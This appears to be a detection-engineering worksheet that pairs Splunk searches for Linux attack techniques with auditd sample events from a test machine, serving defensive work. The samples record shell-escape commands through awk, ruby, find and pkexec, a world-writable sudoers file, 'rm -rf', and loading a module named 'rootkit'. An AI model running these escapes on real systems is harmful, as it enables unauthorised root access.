type=EXECVE msg=audit(03/03/2023 19:08:06.713:1635) : argc=1 a0=visudo 
type=PATH msg=audit(03/03/2023 19:08:06.713:1635) : item=0 name=/sbin/visudo inode=474263 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/03/2023 19:08:06.713:1635) : proctitle=visudo 
type=USER_CMD msg=audit(03/03/2023 19:08:06.713:1632) : pid=14249 uid=test-2 auid=test-2 ses=42 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=visudo terminal=pts/1 res=success' 
type=SYSCALL msg=audit(03/03/2023 19:07:58.949:1629) : arch=x86_64 syscall=open success=no exit=EACCES(Permission denied) a0=0x5599f76d3c40 a1=O_RDWR|O_CREAT a2=0440 a3=0x2 items=2 ppid=13259 pid=14248 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=42 comm=visudo exe=/usr/sbin/visudo subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=actions 
type=PROCTITLE msg=audit(03/03/2023 19:07:58.949:1629) : proctitle=visudo 
type=SYSCALL msg=audit(03/03/2023 19:07:58.949:1628) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xbd3480 a1=0xbd3560 a2=0xbd2ee0 a3=0x7ffc5d9537e0 items=2 ppid=13259 pid=14248 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=42 comm=visudo exe=/usr/sbin/visudo subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=visudo 
type=EXECVE msg=audit(03/03/2023 19:07:58.949:1628) : argc=1 a0=visudo 
type=PATH msg=audit(03/03/2023 19:07:58.949:1628) : item=0 name=/usr/sbin/visudo inode=474263 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/03/2023 19:07:58.949:1628) : proctitle=visudo 
type=CONFIG_CHANGE msg=audit(03/03/2023 19:07:27.762:1620) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=visudo list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/03/2023 19:07:27.762:1584) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=visudo list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/03/2023 19:07:18.112:1544) : auid=root ses=39 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=visudo list=exit res=yes 
type=USER_CMD msg=audit(03/03/2023 19:02:49.267:1459) : pid=13864 uid=test-2 auid=test-2 ses=42 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=visudo terminal=pts/1 res=success' 
```  

sudoers:
```
type=PATH msg=audit(03/03/2023 19:29:29.173:1748) : item=0 name=/etc/sudoers inode=34487884 dev=fd:00 mode=file,777 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/03/2023 19:29:29.167:1747) : item=1 name=/etc/sudoers inode=34487884 dev=fd:00 mode=file,777 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/03/2023 19:29:06.400:1746) : item=0 name=/etc/sudoers inode=34487884 dev=fd:00 mode=file,440 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
```

### Linux AWK Privilege Escalation

Datamodel: Processes  
Auditd config: Yes   
CIM Mapping: Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_id Processes.parent_process_id Processes.process_guid  
Search:  

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process="*awk*"  AND Processes.process="*BEGIN*system*" by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_id Processes.parent_process_id Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`| `linux_awk_privilege_escalation_filter`
```
Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/16/2023 15:55:12.730:434) : pid=2707 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=awk BEGIN {system("/bin/bash")} terminal=pts/1 res=success' 

```  

### Linux Ruby Privilege Escalation

Datamodel: Processes  
Auditd config: Yes   
CIM Mapping: 
Search: Remove sudo condition 

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process="*ruby*-e*" AND Processes.process="*exec*" by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_id Processes.parent_process_id Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_ruby_privilege_escalation_filter`
 ```

Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/16/2023 16:45:05.798:825) : pid=5940 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=ruby -e exec "/bin/sh" terminal=pts/1 res=success'
```  


### Linux pkexec Privilege Escalation

Datamodel: Processes  
Auditd config:   
CIM Mapping: 
Search: Remove regex filter | regex process="(^.{1}$)"

```
| tstats `security_content_summariesonly` count FROM datamodel=Endpoint.Processes where Processes.process_name=pkexec by _time Processes.dest Processes.process_id
  Processes.parent_process_name Processes.process_name Processes.process Processes.process_path | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)` | `linux_pkexec_privilege_escalation_filter`
```

Limitations:   
Sample events:    

```
type=USER_START msg=audit(03/16/2023 17:16:34.968:1202) : pid=8048 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:session_open grantors=pam_keyinit,pam_limits,pam_systemd,pam_unix acct=root exe=/usr/bin/pkexec hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=PATH msg=audit(03/16/2023 17:16:30.020:1199) : item=0 name=/usr/bin/pkexec inode=100959683 dev=fd:00 mode=file,suid,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/16/2023 17:16:30.020:1199) : proctitle=pkexec /bin/sh 
type=PATH msg=audit(03/16/2023 17:16:20.073:1198) : item=0 name=/usr/bin/pkexec inode=100959683 dev=fd:00 mode=file,suid,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/16/2023 17:16:20.073:1198) : proctitle=pkexec 
type=PATH msg=audit(03/16/2023 17:16:16.366:1197) : item=0 name=/usr/bin/pkexec inode=100959683 dev=fd:00 mode=file,suid,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
```  

### Linux Deleting Critical Directory Using RM Command

Datamodel: Processes  
Auditd config: Yes  
CIM Mapping:   
Search: No change  
Limitations:   
Sample events:    

```
type=PROCTITLE msg=audit(03/17/2023 02:31:03.393:4655) : proctitle=rm -rf /var/tmp/boot/ 
type=PROCTITLE msg=audit(03/17/2023 02:31:03.393:4654) : proctitle=rm -rf /var/tmp/boot/ 

```  

### Linux Find Privilege Escalation

Datamodel: Process  
Auditd config: Yes   
CIM Mapping: Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_id Processes.parent_process_id Processes.process_guid
Search: Remove sudo filter 

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) 
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*find*" AND Processes.process="*-exec*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_find_privilege_escalation_filter`
```

Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/17/2023 16:11:07.373:506) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5643bb379248 a1=0x5643bb38b198 a2=0x5643bb39ef00 a3=0x0 items=2 ppid=2017 pid=2019 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=2 comm=find exe=/usr/bin/find subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=find_priv_escalation 
type=EXECVE msg=audit(03/17/2023 16:11:07.373:506) : argc=6 a0=find a1=. a2=-exec a3=/bin/sh a4=; a5=-quit 
type=PATH msg=audit(03/17/2023 16:11:07.373:506) : item=0 name=/bin/find inode=100680441 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/17/2023 16:11:07.373:506) : proctitle=find . -exec /bin/sh ; -quit 
type=USER_CMD msg=audit(03/17/2023 16:11:07.363:503) : pid=2017 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=find . -exec /bin/sh ; -quit terminal=pts/1 res=success' 

```  


### Linux Add Files In Known Crontab Directories

Auditd config: Y  
CIM Mapping: file_path, dest, file_create_time, file_name, process_guid  
Search: No change required  
Limitations: Known crontab config locations only  
Sample events:    

```
type=PATH msg=audit(02/15/2023 09:10:23.932:2535) : item=0 name=/etc/cron.d/ inode=67621834 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:system_cron_spool_t:s0 objtype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(02/15/2023 09:10:23.932:2535) : item=1 name=/etc/cron.d/.0hourly.swp inode=67495461 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:system_cron_spool_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(02/15/2023 09:10:23.932:2534) : item=0 name=/etc/cron.d/ inode=67621834 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:system_cron_spool_t:s0 objtype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(02/15/2023 09:10:23.932:2534) : item=1 name=/etc/cron.d/0hourly~ inode=67621833 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:system_cron_spool_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
```


### Linux System Network Discovery

Datamodel: Endpoint.Processes. 
Auditd config: Y  
CIM Mapping: Processes.process_name, Processes.process_id, Processes.parent_process_id, Processes.process_guid, Processes.dest, Processes.user  
Search: No change  
Limitations: may capture normal event made by administrator during auditing or testing network connection of specific host or network to network  
Sample events:    

```
type=SYSCALL msg=audit(02/24/2023 16:23:37.991:693) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x13fe1c0 a1=0x13c5060 a2=0x13c9510 a3=0x7ffc73b9e860 items=2 ppid=6953 pid=6954 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=6 comm=systemctl exe=/usr/bin/systemctl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemd 
type=SYSCALL msg=audit(02/24/2023 16:23:12.711:692) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x2408380 a1=0x240a760 a2=0x24100d0 a3=0x7ffd3630f660 items=2 ppid=4585 pid=6929 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=16 comm=route exe=/usr/sbin/route subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=sbin_susp 
type=SYSCALL msg=audit(02/24/2023 16:23:03.777:691) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x2408340 a1=0x240eb60 a2=0x24100d0 a3=0x7ffd3630f660 items=3 ppid=4585 pid=6928 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=16 comm=firewall-cmd exe=/usr/bin/python2.7 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=bin_susp 
type=SYSCALL msg=audit(02/24/2023 16:22:58.367:690) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x240f5a0 a1=0x240eac0 a2=0x24100d0 a3=0x7ffd3630f660 items=2 ppid=4585 pid=6927 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=16 comm=netstat exe=/usr/bin/netstat subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=bin_susp 
type=SYSCALL msg=audit(02/24/2023 16:22:38.081:687) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x1e901c0 a1=0x1e57060 a2=0x1e5b510 a3=0x7ffe18e4dee0 items=2 ppid=6885 pid=6886 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=6 comm=systemctl exe=/usr/bin/systemctl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemd 
type=SYSCALL msg=audit(02/24/2023 16:22:38.020:686) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xdc51c0 a1=0xd8c060 a2=0xd90510 a3=0x7ffc47f64d20 items=2 ppid=6873 pid=6874 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=6 comm=systemctl exe=/usr/bin/systemctl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemd 
type=SYSCALL msg=audit(02/24/2023 16:21:39.473:685) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x2408380 a1=0x240c6a0 a2=0x24100d0 a3=0x7ffd3630f660 items=2 ppid=4585 pid=6840 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=16 comm=ss exe=/usr/sbin/ss subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=sbin_susp 
type=SYSCALL msg=audit(02/24/2023 16:21:38.092:684) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xf721c0 a1=0xf39060 a2=0xf3d510 a3=0x7fffd4af2920 items=2 ppid=6821 pid=6822 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=6 comm=systemctl exe=/usr/bin/systemctl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemd 
type=SYSCALL msg=audit(02/24/2023 16:21:38.024:683) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x10871c0 a1=0x104e060 a2=0x1052510 a3=0x7fff5232d360 items=2 ppid=6809 pid=6810 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=6 comm=systemctl exe=/usr/bin/systemctl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemd 
type=SYSCALL msg=audit(02/24/2023 16:20:38.028:680) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x1aee1c0 a1=0x1ab5060 a2=0x1ab9510 a3=0x7ffd80f1d3e0 items=2 ppid=6744 pid=6745 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=6 comm=systemctl exe=/usr/bin/systemctl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemd 
type=SYSCALL msg=audit(02/24/2023 16:20:37.973:679) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x11301c0 a1=0x10f7060 a2=0x10fb510 a3=0x7ffd52f02960 items=2 ppid=6732 pid=6733 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=6 comm=systemctl exe=/usr/bin/systemctl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemd 
type=SYSCALL msg=audit(02/24/2023 16:20:37.973:679) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x11301c0 a1=0x10f7060 a2=0x10fb510 a3=0x7ffd52f02960 items=2 ppid=6732 pid=6733 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=6 comm=systemctl exe=/usr/bin/systemctl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemd 
type=SYSCALL msg=audit(02/24/2023 16:20:06.880:678) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x2408340 a1=0x240c600 a2=0x24100d0 a3=0x7ffd3630f660 items=2 ppid=4585 pid=6708 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=16 comm=ip exe=/usr/sbin/ip subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=sbin_susp 
type=SYSCALL msg=audit(02/24/2023 16:19:51.720:670) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x24000c0 a1=0x240dfc0 a2=0x24100d0 a3=0x7ffd3630f660 items=2 ppid=4585 pid=6698 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=16 comm=arp exe=/usr/sbin/arp subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=sbin_susp 
type=SYSCALL msg=audit(02/24/2023 16:19:38.023:669) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x107f1c0 a1=0x1046060 a2=0x104a510 a3=0x7ffecc53f6e0 items=2 ppid=6679 pid=6680 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=6 comm=systemctl exe=/usr/bin/systemctl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemd 
type=SYSCALL msg=audit(02/24/2023 16:19:37.983:668) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x251e1c0 a1=0x24e5060 a2=0x24e9510 a3=0x7ffdc19a7da0 items=2 ppid=6667 pid=6668 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=6 comm=systemctl exe=/usr/bin/systemctl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemd 
type=SYSCALL msg=audit(02/24/2023 16:19:37.983:668) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x251e1c0 a1=0x24e5060 a2=0x24e9510 a3=0x7ffdc19a7da0 items=2 ppid=6667 pid=6668 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=6 comm=systemctl exe=/usr/bin/systemctl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemd 
type=SYSCALL msg=audit(02/24/2023 16:19:36.019:667) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x2408380 a1=0x24082c0 a2=0x24100d0 a3=0x7ffd3630f660 items=2 ppid=4585 pid=6643 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=16 comm=ifconfig exe=/usr/sbin/ifconfig subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=sbin_susp 
type=SYSCALL msg=audit(02/24/2023 16:18:38.034:665) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x14c21c0 a1=0x1489060 a2=0x148d510 a3=0x7ffe5b487360 items=2 ppid=6622 pid=6623 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=6 comm=systemctl exe=/usr/bin/systemctl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemd 
type=SYSCALL msg=audit(02/24/2023 16:18:37.977:664) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x226f1c0 a1=0x2236060 a2=0x223a510 a3=0x7ffc3dd328a0 items=2 ppid=6610 pid=6611 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=6 comm=systemctl exe=/usr/bin/systemctl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=systemd 
```





### Linux Deletion of SSL Certificate

FILESYSTEM & PROCESS




### Linux Possible Access Or Modification Of sshd Config File

Datamodel: Endpoint.Processes  
Auditd config:   
CIM Mapping: Processes.process_name, Processes.process, Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_id Processes.parent_process_id
Search: No change  
Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(02/27/2023 13:55:26.404:786) : pid=5156 uid=test-2 auid=test-2 ses=38 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=cat /etc/ssh/sshd_config terminal=pts/1 res=success' 

```

### Linux Obfuscated Files or Information Base64 Decode

Datamodel: Processes  
Auditd config: Yes  
CIM Mapping: Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_id Processes.parent_process_id  
Search: No change  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/17/2023 16:34:27.273:855) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x9da260 a1=0xa00cc0 a2=0x9d9ee0 a3=0x7ffc1af8dfa0 items=2 ppid=1419 pid=3542 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=2 comm=base64 exe=/usr/bin/base64 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=EXECVE msg=audit(03/17/2023 16:34:27.273:855) : argc=2 a0=base64 a1=-d 
type=PATH msg=audit(03/17/2023 16:34:27.273:855) : item=0 name=/usr/bin/base64 inode=100817933 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/17/2023 16:34:27.273:855) : proctitle=base64 -d 
type=SYSCALL msg=audit(03/17/2023 16:32:31.252:848) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x9da130 a1=0xa00cc0 a2=0x9d9ee0 a3=0x7ffc1af8e1e0 items=2 ppid=1419 pid=3432 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=2 comm=base64 exe=/usr/bin/base64 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=EXECVE msg=audit(03/17/2023 16:32:31.252:848) : argc=1 a0=base64 
type=PATH msg=audit(03/17/2023 16:32:31.252:848) : item=0 name=/usr/bin/base64 inode=100817933 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/17/2023 16:32:31.252:848) : proctitle=base64 
type=SYSCALL msg=audit(03/17/2023 16:31:08.493:844) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x9d9b00 a1=0xa00cc0 a2=0x9d9ee0 a3=0x7ffc1af8e1e0 items=2 ppid=1419 pid=3375 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=2 comm=base64 exe=/usr/bin/base64 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=EXECVE msg=audit(03/17/2023 16:31:08.493:844) : argc=1 a0=base64 
type=PATH msg=audit(03/17/2023 16:31:08.493:844) : item=0 name=/usr/bin/base64 inode=100817933 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/17/2023 16:31:08.493:844) : proctitle=base64 
type=SYSCALL msg=audit(03/17/2023 16:31:05.739:843) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xa00ea0 a1=0x9ffdc0 a2=0x9d9ee0 a3=0x7ffc1af8dd60 items=2 ppid=1419 pid=3369 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=2 comm=base64 exe=/usr/bin/base64 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=EXECVE msg=audit(03/17/2023 16:31:05.739:843) : argc=2 a0=base64 a1=-d 
type=PATH msg=audit(03/17/2023 16:31:05.739:843) : item=0 name=/usr/bin/base64 inode=100817933 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/17/2023 16:31:05.739:843) : proctitle=base64 -d 

```  

### Linux Deletion Of Cron Jobs

FILESYSTEM & PROCESS


### Linux Disable Services

Datamodel: Processes  
Auditd config: Yes    
CIM Mapping: Processes.parent_process_name Processes.process_name Processes.process Processes.process_id Processes.parent_process_id Processes.process_guid Processes.dest Processes.user   
Search: No Change   
Limitations:   
Sample events:    

```
type=EXECVE msg=audit(03/17/2023 16:51:14.263:1356) : argc=4 a0=/bin/sh a1=/sbin/service a2=disable a3=apache2 
type=PROCTITLE msg=audit(03/17/2023 16:51:14.263:1356) : proctitle=/bin/sh /sbin/service disable apache2 
type=USER_CMD msg=audit(03/17/2023 16:51:14.246:1353) : pid=4813 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=service disable apache2 terminal=pts/1 res=success' 
type=EXECVE msg=audit(03/17/2023 16:50:43.996:1337) : argc=4 a0=/bin/sh a1=/sbin/service a2=disable a3=apache2 
type=PROCTITLE msg=audit(03/17/2023 16:50:43.996:1337) : proctitle=/bin/sh /sbin/service disable apache2 
type=USER_CMD msg=audit(03/17/2023 16:50:43.947:1334) : pid=4732 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=service disable apache2 terminal=pts/1 res=success' 
type=USER_CMD msg=audit(03/17/2023 16:50:31.596:1332) : pid=4728 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=system disable apache2 terminal=pts/1 res=failed' 
type=USER_CMD msg=audit(03/17/2023 16:50:23.348:1329) : pid=4726 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=systemctl disable apache2 terminal=pts/1 res=failed' 

```  


### Linux Install Kernel Module Using Modprobe Utility

Datamodel: Processes  
Auditd config:   
CIM Mapping: 
Search: Remove sudo/kmod filter  

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process = *modprobe* by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_id Processes.parent_process_id Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)` | `linux_install_kernel_module_using_modprobe_utility_filter`
```

Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/17/2023 17:05:18.952:1690) : pid=5805 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=modprobe vmhgfs terminal=pts/1 res=success' 
type=USER_CMD msg=audit(03/17/2023 17:05:00.700:1676) : pid=5793 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=modprobe -l terminal=pts/1 res=success' 
type=USER_CMD msg=audit(03/17/2023 17:04:37.514:1665) : pid=5736 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=modprobe ./rootkit terminal=pts/1 res=success' 
